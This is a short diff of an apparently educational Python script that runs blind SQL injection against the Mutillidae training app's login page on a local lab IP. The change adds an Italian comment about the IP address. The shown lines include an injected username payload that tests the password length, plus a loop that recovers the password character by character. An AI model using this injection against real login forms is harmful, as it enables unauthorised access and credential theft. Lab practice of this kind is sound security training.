@@ -4,7 +4,7 @@ alphabet = string.printable
 
 print(alphabet)
 print(len(alphabet))
-url = "http://192.168.122.152/mutillidae/index.php?page=login.php"
+url = "http://192.168.122.152/mutillidae/index.php?page=login.php" #cambiare l'ip con quello impostato dal dhcp
 
 data = {
     'username': "john' AND LENGTH(password)=6 -- ",
@@ -36,12 +36,4 @@ for i in range(1,7):
 
 
 print(password_trovata)
-
-
-
-
-
-
-
-
 
